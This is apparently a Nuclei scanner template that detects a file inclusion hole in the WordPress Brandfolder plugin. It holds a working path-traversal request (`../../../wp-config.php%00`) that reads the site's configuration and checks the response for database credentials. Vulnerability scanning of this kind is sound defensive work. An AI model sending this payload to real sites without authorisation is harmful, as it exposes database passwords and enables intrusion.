id: brandfolder-lfi
info:
  author: 0x_Akoko
  description: A vulnerability in WordPress Brandfolder allows remote attackers to
    access arbitrary files that reside on the local and remote server and disclose
    their content.
  name: Wordpress brandfolder plugin - RFI & LFI
  reference:
  - https://www.exploit-db.com/exploits/39591
  - https://cxsecurity.com/issue/WLB-2016030120
  severity: high
  tags: wordpress,wp-plugin,lfi,rfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
